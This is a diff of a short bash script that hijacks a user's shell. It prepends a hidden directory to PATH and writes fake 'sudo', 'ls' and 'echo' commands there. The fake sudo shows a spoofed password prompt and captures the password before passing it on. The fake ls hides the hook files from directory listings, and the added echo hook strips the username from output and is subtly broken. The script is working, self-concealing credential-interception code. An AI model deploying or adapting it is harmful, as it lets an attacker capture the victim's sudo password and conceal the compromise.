@@ -1,16 +1,21 @@
 #!/bin/bash
 
-PATH=~:$PATH
+PATH=~/raptor:$PATH
 
 #Hook sudo
-echo "#!/bin/bash" > ~/sudo
-echo "read -sp \"[sudo] password for \$(whoami): \" p" >> ~/sudo
-echo "echo \$p | /usr/bin/sudo -S \$@" >> ~/sudo
-chmod +x sudo
+echo "#!/bin/bash" > ~/raptor/sudo
+echo "read -sp \"[sudo] password for \$(whoami): \" p" >> ~/raptor/sudo
+echo "echo \$p | /usr/bin/sudo -S \$@" >> ~/raptor/sudo
+chmod +x ~/raptor/sudo
 
 #Hook ls
-echo "#!/bin/bash" > ~/ls
-echo "/bin/ls \$@ | sed 's/ls//g' | sed 's/cd//g' | sed 's/sudo//g' | column" >> ~/ls
-chmod +x ~/ls
+echo "#!/bin/bash" > ~/raptor/ls
+echo "/bin/ls -C --color=always \$@ | sed 's/ls//g' | sed 's/cd//g' | sed 's/sudo//g' | sed 's/raptor//g' | column" >> ~/raptor/ls
+chmod +x ~/raptor/ls
+
+#Hook echo
+echo "#!/bin/bash" > ~/raptor/echo
+echo "/bin/echo $@ | sed s/$(whoami)//g" >> ~/raptor/echo
+chmod +x ~/raptor/echo
 
 exec bash
